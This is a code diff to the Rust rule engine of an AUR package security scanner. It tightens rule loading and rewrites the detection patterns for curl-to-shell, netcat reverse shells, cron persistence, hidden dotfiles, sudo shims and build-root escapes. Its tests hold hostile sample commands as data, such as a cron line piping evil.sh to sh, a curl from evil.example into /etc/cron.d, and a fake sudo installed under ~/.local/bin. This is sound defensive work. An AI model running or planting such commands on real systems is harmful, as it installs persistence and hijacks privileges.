@@ -1,23 +1,26 @@
 //! Rule engine for pattern-based security detection
 
 mod loader;
+pub mod shadow;
 
 pub use loader::RuleLoader;
+pub use shadow::{ShadowDef, ShadowSet};
 
-use crate::error::Result;
+use crate::error::{Result, ScanError};
 use crate::resolve::resolve_variables;
 use crate::textutil::{
-    deobfuscate, logical_lines, QUOTE_SPLIT_PATTERN, SHELLS, SHELL_LAUNCHER, SHELL_PATH,
+    deobfuscate, logical_lines, CMD_START, QUOTE_SPLIT_PATTERN, SHELLS, SHELL_LAUNCHER, SHELL_PATH,
 };
 use crate::types::{Category, FileType, Severity};
 use regex::{Regex, RegexBuilder};
 use serde::Deserialize;
-use std::collections::HashMap;
+use std::collections::{HashMap, HashSet};
 use std::path::Path;
 
 /// A security detection rule (pattern-based). Community rule files use this
 /// shape; `file_types`/`patterns` default to empty so a rule file is concise.
 #[derive(Debug, Clone, Deserialize)]
+#[serde(deny_unknown_fields)]
 pub struct Rule {
     /// Unique identifier (e.g., "DLE-001")
     pub id: String,
@@ -68,7 +71,7 @@ fn default_file_types() -> Vec<FileType> {
 
 /// Pattern type for matching
 #[derive(Debug, Clone, Deserialize)]
-#[serde(tag = "type", rename_all = "snake_case")]
+#[serde(tag = "type", rename_all = "snake_case", deny_unknown_fields)]
 pub enum Pattern {
     /// Regular expression pattern
     Regex { pattern: String },
@@ -212,22 +215,50 @@ impl RuleEngine {
         }
     }
 
-    /// Load rules from a directory containing TOML files
+    /// Load rules from a directory containing TOML files.
+    ///
+    /// Every candidate is vetted before it is added: a rule whose id collides
+    /// with a built-in, an analyzer code, or an earlier-loaded rule is rejected
+    /// with a stderr warning (a user-writable rules directory must never be able
+    /// to replace or lower a built-in detection), and a rule that does not
+    /// compile or has no patterns is skipped. One bad rule or file never
+    /// aborts the rest of the directory.
     pub fn load_rules_from_dir(&mut self, dir: &Path) -> Result<()> {
         let loader = RuleLoader::new();
-        let rules = loader.load_from_directory(dir)?;
+        let mut reserved = reserved_rule_ids();
+        reserved.extend(self.rules_by_id.keys().cloned());
+        let rules = loader.load_vetted_from_directory(dir, &mut reserved)?;
 
         for rule in rules {
-            self.add_rule(rule)?;
+            let id = rule.id.clone();
+            if let Err(e) = self.add_rule(rule) {
+                warn_rule(&format!("skipping rule {id} from {}: {e}", dir.display()));
+            }
         }
 
         Ok(())
     }
 
-    /// Add a single rule to the engine
+    /// Add a single rule to the engine.
+    ///
+    /// Fails if a rule with the same id is already loaded: the first definition
+    /// (built-ins are loaded first) always wins, so nothing can replace or
+    /// lower an existing detection by re-using its id.
     pub fn add_rule(&mut self, rule: Rule) -> Result<()> {
+        if self.rules_by_id.contains_key(&rule.id) {
+            return Err(ScanError::Config(format!(
+                "duplicate rule id {}: an earlier rule with this id is already loaded",
+                rule.id
+            )));
+        }
         if !rule.enabled {
             return Ok(());
+        }
+        if rule.patterns.is_empty() {
+            return Err(ScanError::Config(format!(
+                "rule {} has no patterns and could never fire",
+                rule.id
+            )));
         }
 
         let mut compiled_patterns = Vec::new();
@@ -240,8 +271,19 @@ impl RuleEngine {
             compiled_patterns,
         };
 
-        // Index by file type
-        for file_type in &rule.file_types {
+        // Index by file type. Local sidecar scripts (`FileType::SourceFile`) run
+        // inside build()/package() just like the PKGBUILD body, so every rule
+        // that applies to the PKGBUILD also applies to them.
+        let mut types: Vec<FileType> = Vec::new();
+        for ft in &rule.file_types {
+            if !types.contains(ft) {
+                types.push(*ft);
+            }
+        }
+        if types.contains(&FileType::Pkgbuild) && !types.contains(&FileType::SourceFile) {
+            types.push(FileType::SourceFile);
+        }
+        for file_type in &types {
             self.rules_by_type
                 .entry(*file_type)
                 .or_default()
@@ -276,6 +318,18 @@ impl RuleEngine {
 
     /// Match content against all rules for a file type
     pub fn match_content(&self, content: &str, file_type: FileType) -> Vec<RuleMatch> {
+        let local = ShadowSet::from_text(content).names();
+        self.match_content_with(content, file_type, &local)
+    }
+
+    /// [`Self::match_content`] with the package-wide set of redefined printer
+    /// names (see [`ShadowSet::names`]), which are code rather than inert text.
+    pub fn match_content_with(
+        &self,
+        content: &str,
+        file_type: FileType,
+        shadowed: &HashSet<String>,
+    ) -> Vec<RuleMatch> {
         let mut matches = Vec::new();
 
         let rules = match self.rules_by_type.get(&file_type) {
@@ -316,7 +370,7 @@ impl RuleEngine {
         // pure-printer heredoc, e.g. a `cat <<EOF` post_install message) are not
         // executed, so low-risk path-presence rules must not match them. A
         // heredoc fed to an interpreter, or redirected to a file, is still code.
-        let informational = informational_lines(&line_strs);
+        let informational = informational_lines_with(&line_strs, shadowed);
 
         for compiled in rules {
             for (idx, (phys_line, line)) in lines.iter().enumerate() {
@@ -330,10 +384,13 @@ impl RuleEngine {
                     continue;
                 }
 
-                for pattern in &compiled.compiled_patterns {
+                // Report each (rule, line) at most once, however many of the
+                // rule's patterns (or text variants) hit it: a rule with two
+                // patterns matching one line must not double its count.
+                'patterns: for pattern in &compiled.compiled_patterns {
                     // Try the raw line, then its de-obfuscated form, then its
                     // variable-resolved form. Each variant is matched independently
-                    // and can only ADD a finding; the first hit per pattern wins.
+                    // and can only ADD a finding; the first hit per line wins.
                     if let Some(m) = self.match_pattern(pattern, line, &compiled.rule) {
                         matches.push(RuleMatch {
                             rule_id: compiled.rule.id.clone(),
@@ -342,7 +399,7 @@ impl RuleEngine {
                             matched_text: m.1,
                             context: line.clone(),
                         });
-                        continue;
+                        break 'patterns;
                     }
                     // Raw line didn't match, but its de-obfuscated form might.
                     if let Some(decoded) = &deobf[idx] {
@@ -354,7 +411,7 @@ impl RuleEngine {
                                 matched_text: m.1,
                                 context: format!("{line}    [de-obfuscated → {decoded}]"),
                             });
-                            continue;
+                            break 'patterns;
                         }
                     }
                     // …or its variable-resolved form (a command hidden behind `$x`).
@@ -368,6 +425,7 @@ impl RuleEngine {
                                 matched_text: m.1,
                                 context: format!("{line}    [resolved → {resolved_line}]"),
                             });
+                            break 'patterns;
                         }
                     }
                 }
@@ -436,14 +494,73 @@ impl Default for RuleEngine {
     }
 }
 
+/// Print a loud, stable-prefixed rule-loading warning to stderr (never stdout:
+/// stdout carries machine-readable output).
+pub(crate) fn warn_rule(msg: &str) {
+    eprintln!("aur-scan: warning: {msg}");
+}
+
+/// Ids a community rule may never take: every built-in rule and every
+/// analyzer-owned code. A rule re-using one of these would shadow or lower it.
+pub fn reserved_rule_ids() -> HashSet<String> {
+    let mut ids: HashSet<String> = get_builtin_rules().into_iter().map(|r| r.id).collect();
+    ids.extend(crate::catalog::analyzer_codes().into_iter().map(|e| e.id));
+    ids
+}
+
+/// Load, vet and return every community rule from `dirs`, in order, rejecting
+/// id collisions with built-ins, analyzer codes and earlier rules. This is the
+/// single loader shared by the scan engine and the `codes` catalog, so the
+/// catalog lists exactly the rules that will really run.
+pub fn load_community_rules<I: IntoIterator<Item = std::path::PathBuf>>(dirs: I) -> Vec<Rule> {
+    let loader = RuleLoader::new();
+    let mut reserved = reserved_rule_ids();
+    let mut out = Vec::new();
+    for dir in dirs {
+        if !dir.is_dir() {
+            continue;
+        }
+        match loader.load_vetted_from_directory(&dir, &mut reserved) {
+            Ok(rules) => out.extend(rules),
+            Err(e) => warn_rule(&format!(
+                "failed to read community rules from {}: {e}",
+                dir.display()
+            )),
+        }
+    }
+    out
+}
+
+/// True when this process runs with root's effective uid. Uses the owner of
+/// `/proc/self` (the process's effective uid) so no libc dependency is needed;
+/// if that cannot be determined it fails safe and reports privileged.
+pub(crate) fn running_as_root() -> bool {
+    use std::os::unix::fs::MetadataExt;
+    std::fs::metadata("/proc/self")
+        .map(|m| m.uid() == 0)
+        .unwrap_or(true)
+}
+
 /// Standard directories users/distros can drop community rule TOML files into.
+///
+/// A root process (the pacman hook) reads only the root-owned system
+/// directories: the per-user config dir is writable by any earlier package's
+/// `build()`, and must never feed rules to a privileged scanner (same policy as
+/// `ScanConfig::resolve_for_privilege`).
 pub fn user_rule_dirs() -> Vec<std::path::PathBuf> {
+    user_rule_dirs_for(running_as_root())
+}
+
+/// [`user_rule_dirs`] with the privilege decision supplied by the caller.
+pub fn user_rule_dirs_for(privileged: bool) -> Vec<std::path::PathBuf> {
     let mut dirs = vec![
         std::path::PathBuf::from("/usr/share/aur-scanner/rules.d"),
         std::path::PathBuf::from("/etc/aur-scanner/rules.d"),
     ];
-    if let Some(cfg) = dirs::config_dir() {
-        dirs.push(cfg.join("aur-scanner/rules.d"));
+    if !privileged {
+        if let Some(cfg) = dirs::config_dir() {
+            dirs.push(cfg.join("aur-scanner/rules.d"));
+        }
     }
     dirs
 }
@@ -460,6 +577,17 @@ pub fn user_rule_dirs() -> Vec<std::path::PathBuf> {
 /// `sudo`/`setcap`/`sudoers` message or a documentation heredoc cannot raise a
 /// Critical false positive (defect #5).
 pub(crate) fn informational_lines(lines: &[&str]) -> Vec<bool> {
+    // File-local view: a printer redefined in these very lines is not inert.
+    // Callers that can see the whole package use `informational_lines_with` and
+    // pass the package-wide set (a redefinition may live in another file).
+    let local = ShadowSet::from_text(&lines.join("\n")).names();
+    informational_lines_with(lines, &local)
+}
+
+/// [`informational_lines`] with the set of printer names the package redefines
+/// into something that can execute (see [`ShadowSet::names`]). Those names are
+/// code, never inert text, in every file of the package.
+pub(crate) fn informational_lines_with(lines: &[&str], shadowed: &HashSet<String>) -> Vec<bool> {
     let mut flags = vec![false; lines.len()];
     let mut terminator: Option<String> = None;
     for (i, line) in lines.iter().enumerate() {
@@ -470,9 +598,9 @@ pub(crate) fn informational_lines(lines: &[&str]) -> Vec<bool> {
             }
             continue;
         }
-        if let Some(delim) = heredoc_message_delim(line) {
+        if let Some(delim) = heredoc_message_delim(line, shadowed) {
             terminator = Some(delim);
-        } else if is_pure_message_print(line) {
+        } else if is_pure_message_print(line, shadowed) {
             flags[i] = true;
         }
     }
@@ -487,13 +615,11 @@ pub(crate) fn informational_lines(lines: &[&str]) -> Vec<bool> {
 /// must contain no redirection, pipe, command substitution, or command chaining
 /// (any of which could execute or write). `echo x > ~/.bashrc`, `echo "$(curl
 /// evil)"`, and `echo x | sh` therefore are NOT treated as inert.
-fn is_pure_message_print(line: &str) -> bool {
+fn is_pure_message_print(line: &str, shadowed: &HashSet<String>) -> bool {
     let t = line.trim();
     let cmd = t.split([' ', '\t']).next().unwrap_or("");
-    const PRINTERS: &[&str] = &[
-        "echo", "printf", "print", "note", "msg", "msg2", "warning", "plain", "error",
-    ];
-    if !PRINTERS.contains(&cmd) {
+    use shadow::PRINTERS;
+    if !PRINTERS.contains(&cmd) || shadowed.contains(cmd) {
         return false;
     }
     // Anything that could redirect, pipe, substitute, or chain a command means
@@ -564,7 +690,7 @@ fn has_executable_operator(t: &str) -> bool {
 /// If `line` opens a heredoc that just prints a message (no redirection to a
 /// file), return its terminator delimiter. Redirected heredocs write content
 /// somewhere and must still be scanned, so they return `None`.
-fn heredoc_message_delim(line: &str) -> Option<String> {
+fn heredoc_message_delim(line: &str, shadowed: &HashSet<String>) -> Option<String> {
     let pos = line.find("<<")?;
     let rest = line[pos + 2..]
         .strip_prefix('-')
@@ -617,7 +743,7 @@ fn heredoc_message_delim(line: &str) -> Option<String> {
         .next()
         .map(|cmd| {
             let base = cmd.rsplit('/').next().unwrap_or(cmd);
-            matches!(base, "cat" | "echo" | "printf")
+            matches!(base, "cat" | "echo" | "printf") && !shadowed.contains(base)
         })
         .unwrap_or(false);
     // A pipe anywhere on the opener means the body may be fed to a command.
@@ -642,7 +768,10 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             severity: Severity::Critical,
             category: Category::CommandInjection,
             patterns: vec![Pattern::Regex {
-                pattern: format!(r"curl\s+[^|]+\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b"),
+                // `curl URL [| filter]* | sh`: any filter chain (`| rev |`,
+                // `| base64 -d |`, `| tee x |`) between the fetch and the shell.
+                // Segments are `[^|]+` so a `||` fallback is not a pipe.
+                pattern: format!(r"curl\s+[^|]+(?:\|[^|]+)*\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b"),
             }],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
             recommendation: "Download scripts first, review them, then execute".to_string(),
@@ -657,7 +786,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             severity: Severity::Critical,
             category: Category::CommandInjection,
             patterns: vec![Pattern::Regex {
-                pattern: format!(r"wget\s+[^|]+\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b"),
+                pattern: format!(r"wget\s+[^|]+(?:\|[^|]+)*\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b"),
             }],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
             recommendation: "Download scripts first, review them, then execute".to_string(),
@@ -672,11 +801,15 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             severity: Severity::Critical,
             category: Category::CommandInjection,
             patterns: vec![
+                // `curl ... -o FILE ... ; sh FILE` -- download, then run (the
+                // separator may be `&&` or `;`, and the URL may follow the
+                // output flag). The file-tied multi-line form is handled by the
+                // remote_exec analyzer.
                 Pattern::Regex {
-                    pattern: r"curl\s+.*-o\s+[^\s]+\s*&&.*\b(ba)?sh\s+".to_string(),
+                    pattern: format!(r"curl\b[^\n]*?(?:\s-[A-Za-z]*o|\s--output)(?:\s+|=)\S+[^\n]*?(?:&&|;)[^\n]*?(?:{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b\s+\S|\bsource\s+\S)"),
                 },
                 Pattern::Regex {
-                    pattern: r"curl\s+.*-O\s+.*&&.*\./".to_string(),
+                    pattern: r"curl\s+.*-O\s+.*(?:&&|;).*\./".to_string(),
                 },
             ],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
@@ -735,18 +868,29 @@ pub fn get_builtin_rules() -> Vec<Rule> {
         Rule {
             id: "SHELL-002".to_string(),
             name: "Netcat reverse shell".to_string(),
-            description: "Netcat with execute flag indicates reverse shell".to_string(),
+            description: "Netcat with an execute flag indicates a reverse shell".to_string(),
             severity: Severity::Critical,
             category: Category::MaliciousCode,
             patterns: vec![
+                // `nc`/`ncat`/`netcat` in COMMAND POSITION followed by an
+                // execute flag. Three things here are load-bearing, all of them
+                // from issue #32 (`git -C MEGAsync -c protocol.file.allow=...`
+                // reported as a Critical reverse shell):
+                //
+                // 1. `{CMD_START}` — an unanchored `nc` matches the tail of any
+                //    word ending in those two letters, and `MEGAsync ` is
+                //    followed by ` -c `, which is exactly the old pattern.
+                // 2. `[^\n;&|]*` rather than `.*` — the flag must belong to
+                //    THIS command, so a benign `-c` on a later command in the
+                //    same line (`nc -z host 80; git -c foo bar`) cannot be
+                //    borrowed to complete the match.
+                // 3. `-[A-Za-z]*[ec]\b` — covers bundled short flags (`-nve`)
+                //    while `--sh-exec`/`--exec` are listed separately, since a
+                //    long flag's leading `--` does not fit the short-flag form.
                 Pattern::Regex {
-                    pattern: r"nc\s+.*-e\s+".to_string(),
-                },
-                Pattern::Regex {
-                    pattern: r"ncat\s+.*-e\s+".to_string(),
-                },
-                Pattern::Regex {
-                    pattern: r"nc\s+.*-c\s+".to_string(),
+                    pattern: format!(
+                        r"{CMD_START}(?:nc|ncat|netcat)\b[^\n;&|]*\s(?:-[A-Za-z]*[ec]\b|--sh-exec\b|--exec\b)"
+                    ),
                 },
             ],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
@@ -1046,7 +1190,10 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             category: Category::Persistence,
             patterns: vec![
                 Pattern::Regex {
-                    pattern: r"systemctl\s+(enable|start|daemon-reload)".to_string(),
+                    // Enabling/starting a unit is persistence; `daemon-reload` only
+                    // re-reads unit files (every package that ships a unit runs it
+                    // in post_install/post_upgrade) and is not service creation.
+                    pattern: r"systemctl\s+(?:-\S+\s+)*(?:enable|start)\b".to_string(),
                 },
                 Pattern::Regex {
                     pattern: r"/etc/systemd/system/".to_string(),
@@ -1100,26 +1247,80 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             // - Do NOT match `crontab\s+-` as a prefix of `-l`/`-r` (that FPs).
             // - `regex` has no lookaround; enumerate write forms only.
             patterns: vec![
-                // Copy/install/move/tee into a cron path (word-boundary, any indent).
+                // Copy/install/move/tee/link into a cron path (word-boundary,
+                // any indent). `ln -s` plants a cron entry just as well as `cp`.
+                //
+                // Every pattern here stops at a command separator (`[^\n;&|]*`).
+                // An unbounded `[^\n]*` reaches across `;` into the NEXT
+                // command, so `cp a b; rm /etc/cron.d/x` would fire on the
+                // removal -- re-breaking issue #21, where cleaning up a stale
+                // cron entry is the safe direction and must stay silent.
                 Pattern::Regex {
-                    pattern: r"\b(?:cp|install|mv|tee)\b[^\n]*/etc/cron".to_string(),
+                    pattern: r"\b(?:cp|install|mv|tee|ln)\b[^\n;&|]*/etc/cron".to_string(),
                 },
-                // Redirected printers into a cron path.
+                // In-place edit of an existing cron file. `sed -i`/`ed`/`patch`
+                // append a schedule without ever naming a write verb.
                 Pattern::Regex {
-                    pattern: r"(?:echo|printf|cat)\b[^\n]*>\s*[^\n]*/etc/cron".to_string(),
+                    pattern: r"\b(?:sed|perl|ed|patch)\b[^\n;&|]*(?:-i|--in-place)[^\n;&|]*/etc/cron"
+                        .to_string(),
                 },
+                // ANY redirect into a cron path. Enumerating the printers
+                // (echo/printf/cat) let every other producer through --
+                // `curl ... > /etc/cron.d/pkg`, `base64 -d > ...`, or a bare
+                // `> /etc/cron.d/pkg` truncation. The redirect IS the write, so
+                // match on that rather than on what feeds it.
+                //
+                // The target must be the redirect's own next token (no spaces,
+                // no separators), so `echo done > /dev/null; rm /etc/cron.d/x`
+                // cannot match on the removal.
+                Pattern::Regex {
+                    pattern: r#">>?\s*["']?[^\n\s;&|]*/etc/cron"#.to_string(),
+                },
+                // A command and its arguments live on ONE line, so the
+                // separator is `[ \t]+`, never `\s+`. Measured against 503 live
+                // AUR PKGBUILDs, `\s+` crossing a newline made
+                // `python-python-crontab` fire: `pkgname=...-crontab` at the end
+                // of a line, `_name=...` on the next, and the file-argument
+                // pattern matched the literal text "crontab\n_".
+                //
                 // crontab -e (edit schedule).
                 Pattern::Regex {
-                    pattern: r"\bcrontab\s+-e\b".to_string(),
+                    pattern: r"\bcrontab[ \t]+-e\b".to_string(),
                 },
                 // crontab -u USER -e (user-targeted edit). Bare `-u` with `-l`
                 // must not fire — no lookaround, so require the `-e` form.
                 Pattern::Regex {
-                    pattern: r"\bcrontab\s+-u\s+\S+\s+-e\b".to_string(),
+                    pattern: r"\bcrontab[ \t]+-u[ \t]+\S+[ \t]+-e\b".to_string(),
                 },
-                // crontab FILE / path / var (not a dash-flag).
+                // `... | crontab -` reads the new table from stdin. This is THE
+                // standard non-interactive install form, and the enumerated
+                // verb list missed it completely: the file-argument pattern
+                // below excludes `-` from its char class so a dash-flag like
+                // `-l`/`-r` cannot trip it, which also excluded the bare `-`
+                // that means stdin. Cover it explicitly, including the
+                // `crontab -u root -` variant. End-of-argument only, so `-l`
+                // and `-r` still cannot match.
                 Pattern::Regex {
-                    pattern: r"\bcrontab\s+(?:/|\./|\.\./|~|\$|[A-Za-z0-9_.])".to_string(),
+                    pattern: r"\bcrontab[ \t]+(?:-u[ \t]+\S+[ \t]+)?-[ \t]*(?:$|[\n;&|<])"
+                        .to_string(),
+                },
+                // crontab -u USER PATH (install a schedule from a file).
+                Pattern::Regex {
+                    pattern: r"\bcrontab[ \t]+-u[ \t]+\S+[ \t]+(?:/|\./|\.\./|~|\$)".to_string(),
+                },
+                // crontab PATH / var (not a dash-flag). A path-shaped argument
+                // is unambiguous, so it can appear anywhere on the line.
+                Pattern::Regex {
+                    pattern: r"\bcrontab[ \t]+(?:/|\./|\.\./|~|\$)".to_string(),
+                },
+                // crontab BARE-FILENAME. Split out because a bare word argument
+                // is also what English prose looks like: `pkgdesc="Crontab
+                // module for python"` matched the old combined char class and
+                // fired on 1 of 503 live AUR PKGBUILDs. Requiring the filename
+                // to END the command separates `crontab mycron` from
+                // `Crontab module for ...`, where another word always follows.
+                Pattern::Regex {
+                    pattern: r"\bcrontab[ \t]+[A-Za-z0-9_.]+[ \t]*(?:$|[\n;&|])".to_string(),
                 },
             ],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
@@ -1522,12 +1723,28 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             description: "Creating hidden files in user home directory".to_string(),
             severity: Severity::High,
             category: Category::MaliciousCode,
+            // WRITES only: a redirection into, or a write command targeting, a
+            // dotfile/dotdir under the home directory. Merely READING or
+            // referencing a config dir (`${XDG_CONFIG_HOME:-~/.config}`,
+            // `[ -f ~/.config/x ]`, `cat ~/.config/x`) is not hidden-file creation.
+            // The home token must start a word (preceded by whitespace, a quote,
+            // `=` or `>`), so a `:-`/`:=` default-value form never matches.
             patterns: vec![
+                // echo/cat/printf ... > ~/.x   /   >> $HOME/.x
                 Pattern::Regex {
-                    pattern: r"~/\.[^/]+".to_string(),
+                    pattern: r#">>?\s*["']?(?:~|\$HOME|\$\{HOME\})/\.[^/\s"']+"#.to_string(),
                 },
+                // touch / mkdir / tee / install / ln / dd / truncate / sed -i ... ~/.x
                 Pattern::Regex {
-                    pattern: r"\$HOME/\.[^/]+".to_string(),
+                    pattern: r#"\b(?:touch|mkdir|tee|install|ln|dd|truncate|sed\s+-i\S*)\b[^;&|\n]*?[\s"'=](?:~|\$HOME|\$\{HOME\})/\.[^/\s"']+"#.to_string(),
+                },
+                // cp / mv / rsync with the dotfile as the DESTINATION (last word)
+                Pattern::Regex {
+                    pattern: r#"\b(?:cp|mv|rsync)\b[^;&|\n]*\s["']?(?:~|\$HOME|\$\{HOME\})/\.[^\s;&|]*\s*(?:$|[;&|])"#.to_string(),
+                },
+                // curl -o ~/.x / wget -O ~/.x
+                Pattern::Regex {
+                    pattern: r#"(?:\s-[A-Za-z]*[oO]|\s--output(?:-document)?)(?:\s+|=)["']?(?:~|\$HOME|\$\{HOME\})/\.[^/\s"']+"#.to_string(),
                 },
             ],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
@@ -1714,12 +1931,44 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             severity: Severity::Critical,
             category: Category::MaliciousCode,
             patterns: vec![
+                // A user PATH prefix ending in `/sudo`, however it is spelled.
+                //
+                // The old pattern required a literal `~` or `/home/<user>`
+                // prefix, so `$HOME/.local/bin/sudo` and
+                // `${XDG_BIN_HOME}/sudo` walked straight past a Critical rule.
+                // Anchor on the PATH DIRECTORY instead of on how the home
+                // directory was written: what matters is a `sudo` landing in a
+                // directory that precedes /usr/bin on a user's PATH.
                 Pattern::Regex {
-                    pattern: r"(?:~|/home/[^/\s]+)/\.(?:local/bin|bin)/sudo\b".to_string(),
-                },
-                Pattern::Regex {
-                    pattern: r#"(?:cp|install|mv|ln)\s+[^\n]*\bsudo\b[^\n]*(?:\.local/bin|/usr/local/bin)"#
+                    pattern: r"(?:\.local/bin|\.bin|/usr/local/bin|/usr/local/sbin)/sudo\b"
                         .to_string(),
+                },
+                // Install verb whose DESTINATION is a user PATH prefix, with
+                // `sudo` as the file name.
+                //
+                // The old form demanded the token `sudo` appear BEFORE the
+                // destination directory, which is backwards from every real
+                // command: `cp payload /usr/local/bin/sudo` and
+                // `install -Dm755 stealer "$HOME/.local/bin/sudo"` both put the
+                // name last, and neither matched. Covered by pattern 1 now, but
+                // keep the verb form for a destination written as a variable
+                // (`install -Dm755 shim "$bindir/sudo"`).
+                Pattern::Regex {
+                    pattern: r#"\b(?:cp|install|mv|ln)\b[^\n;&|]*\bsudo\b[^\n;&|]*(?:\.local/bin|/usr/local/bin)"#
+                        .to_string(),
+                },
+                // `$XDG_BIN_HOME/sudo`. The XDG spec fixes that variable at
+                // `~/.local/bin`, so a `sudo` written there is a shim by
+                // definition -- matching it by NAME costs nothing.
+                //
+                // Deliberately NOT generalised to a bare `$var/sudo`:
+                // `cp "$srcdir/sudo.conf" ...` is what the real `sudo` package
+                // does, and a Critical false positive on the genuine article is
+                // worse than the residual gap. A destination variable whose
+                // VALUE is a user bin dir is resolved by the parser's variable
+                // expansion and lands on pattern 1 anyway.
+                Pattern::Regex {
+                    pattern: r"\$\{?XDG_BIN_HOME\}?/sudo\b".to_string(),
                 },
             ],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
@@ -2046,6 +2295,47 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             enabled: true,
             case_sensitive: false,
         },
+        // ============================================================
+        // CRITICAL: escaping the build root
+        // ============================================================
+        Rule {
+            id: "ESCAPE-001".to_string(),
+            name: "Extraction or copy outside the build root".to_string(),
+            description: "An archive is extracted, or files are copied, to an absolute system path instead of $srcdir/$pkgdir. A build runs as your user and must only ever write inside its own directories; writing to / or /usr or /etc during build() installs files that no package owns and that pacman will never remove.".to_string(),
+            severity: Severity::Critical,
+            category: Category::PrivilegeEscalation,
+            patterns: vec![
+                // tar/unzip/cpio extracting to an absolute system root. `-C /`
+                // and `-C /usr` are the shapes that matter; `-C "$srcdir"` and
+                // `-C "$pkgdir/..."` are the normal forms and are excluded by
+                // requiring a literal leading slash NOT followed by a variable.
+                Pattern::Regex {
+                    pattern: format!(
+                        r"{CMD_START}(?:tar|bsdtar)\b[^\n;&|]*\s-C\s+/(?:usr|etc|opt|var|bin|sbin|lib|boot|root|srv)?(?:/|\s|$)"
+                    ),
+                },
+                Pattern::Regex {
+                    pattern: format!(
+                        r"{CMD_START}unzip\b[^\n;&|]*\s-d\s+/(?:usr|etc|opt|var|bin|sbin|lib|boot|root|srv)?(?:/|\s|$)"
+                    ),
+                },
+                // install/cp/mv writing to an absolute system path. The
+                // destination must start with a literal `/` and a known system
+                // directory -- `"$pkgdir/usr/bin"` starts with `$`, so it does
+                // not match.
+                Pattern::Regex {
+                    pattern: format!(
+                        r"{CMD_START}(?:install|cp|mv)\b[^\n;&|]*\s/(?:usr|etc|opt|boot|srv)/[^\s]*\s*$"
+                    ),
+                },
+            ],
+            file_types: vec![FileType::Pkgbuild],
+            recommendation: "Extract and install into $srcdir and $pkgdir only. makepkg copies $pkgdir into the package; anything written elsewhere during a build is invisible to pacman.".to_string(),
+            cwe_id: Some("CWE-22".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+
         Rule {
             id: "TAMPER-001".to_string(),
             name: "Auth database write".to_string(),
@@ -2427,6 +2717,99 @@ mod tests {
             assert!(
                 !m.iter().any(|x| x.rule_id == "PERSIST-003"),
                 "crontab list/remove must not fire for: {s} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn persist003_covers_the_forms_the_verb_list_missed() {
+        // External review, 2.2.0-rc.1: narrowing PERSIST-003 to an enumerated
+        // verb list (to stop `rm` firing, issue #21) cut past the goal. Each
+        // case below installed cron persistence and matched NOTHING.
+        let engine = RuleEngine::default();
+        for s in [
+            // The standard non-interactive install: pipe a table into stdin.
+            // The file-argument pattern excludes `-` from its char class so a
+            // dash-flag cannot trip it, which also excluded the bare `-`.
+            "echo '* * * * * curl evil.sh|sh' | crontab -",
+            "crontab -u root -",
+            "printf '%s\\n' \"$CRON\" | crontab -",
+            // Redirects from something other than echo/printf/cat.
+            "curl -s https://evil.example/c > /etc/cron.d/pkg",
+            "base64 -d payload.b64 >> /etc/cron.hourly/pkg",
+            // A bare truncating redirect, no producer at all.
+            "> /etc/cron.d/pkg",
+            // Link and in-place edit, neither of which names a write verb.
+            "ln -s /opt/pkg/evil.cron /etc/cron.d/pkg",
+            "sed -i '$a * * * * * root /opt/pkg/x' /etc/cron.d/pkg",
+        ] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(
+                m.iter().any(|x| x.rule_id == "PERSIST-003"),
+                "cron persistence must trip PERSIST-003 for: {s} -> {m:?}"
+            );
+        }
+
+        // ...and the widened patterns must not reach across a command
+        // separator into an unrelated removal. Every pattern stops at `;&|`,
+        // so the issue #21 guarantee still holds when the line does more than
+        // one thing.
+        for s in [
+            "echo done > /dev/null; rm -f /etc/cron.daily/pkg",
+            "cp a b && rm /etc/cron.d/pkg",
+            "sed -i s/a/b/ config.txt; rm /etc/cron.d/pkg",
+            "crontab -l | grep -v pkg",
+            // Measured FPs from 503 live AUR PKGBUILDs, both from
+            // `python-python-crontab`. First: a pkgname ENDING in `crontab`
+            // followed by the next line's variable -- a command and its
+            // argument share a line, so the separator must not cross one.
+            "pkgname=python-python-crontab\n_name=python-crontab\n",
+            // Second: the word in prose. A bare-word argument looks exactly
+            // like English, so it only counts when it ends the command.
+            "pkgdesc=\"Crontab module for python\"",
+            "# see the crontab documentation for details",
+        ] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(
+                !m.iter().any(|x| x.rule_id == "PERSIST-003"),
+                "cleanup/read must stay silent for: {s} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn atomic004_catches_the_sudo_shim_written_destination_last() {
+        // External review, 2.2.0-rc.1: both patterns required either a literal
+        // `~`/`/home/<user>` prefix or the token `sudo` BEFORE the destination
+        // directory. Real commands put the file name last, so the natural form
+        // of a Critical, hook-fail-closed rule matched nothing.
+        let engine = RuleEngine::default();
+        for s in [
+            "cp payload /usr/local/bin/sudo",
+            "install -Dm755 stealer \"$HOME/.local/bin/sudo\"",
+            "install -Dm755 shim ${XDG_BIN_HOME}/sudo",
+            "ln -sf /opt/pkg/shim ~/.local/bin/sudo",
+            "mv shim /home/alice/.local/bin/sudo",
+        ] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(
+                m.iter().any(|x| x.rule_id == "ATOMIC-004"),
+                "sudo shim must trip ATOMIC-004 for: {s} -> {m:?}"
+            );
+        }
+
+        // The genuine `sudo` package must stay clean: it ships sudo into
